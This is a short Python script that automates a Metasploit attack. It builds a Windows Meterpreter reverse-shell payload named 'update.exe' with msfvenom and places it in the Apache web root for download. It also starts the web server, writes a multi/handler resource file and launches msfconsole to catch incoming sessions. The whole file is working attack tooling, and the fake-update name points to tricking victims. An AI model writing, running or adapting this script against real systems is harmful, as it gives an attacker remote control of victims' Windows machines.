import os



LHOST=input("[+] Please Enter Your LHOST: ")
LPORT=input("[+] Please Enter Your LPORT: ")
Target =input("[+] Please Enter Your TARGET Ip: ")

apache_start= ("service apache2 start")
mal_gen=("msfvenom -p windows/meterpreter/reverse_tcp LHOST='{}' LPORT='{}' -f exe > update.exe".format(LHOST,LPORT))
trans=("cp update.exe /var/www/html/update.exe")

print ("Generating Malicious Payload, Please wait ")

mal_gen_pro= os.system(mal_gen)
print ("Transferring A Copy of Malicious Payload To /var/www/html")
trans_pro= os.system(trans)
print ("Starting The Apache2 Service")
apache2_pro= os.system(apache_start)



f = open('/home/whoami/Desktop/Projects/Auto_E/windows_exploit.rc' , 'w')
text1 =( """\
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
show options\
""" '\n'
"set LPORT" ' {}'.format(LPORT) + '\n'
"set LHOST"  " {}".format(LHOST) +  '\n' "exploit")

#f.write('\n')
f.write(text1)
#f.write(text2)
f.close()


com1= ("service postgresql start")
com2 = ("msfconsole  -r /home/whoami/Desktop/Projects/Auto_E/windows_exploit.rc")


process1 = os.system(com1)
print ("[+] Starting postgresql service ")
process2 = os.system(com2)
#process3 =os.system(com3)
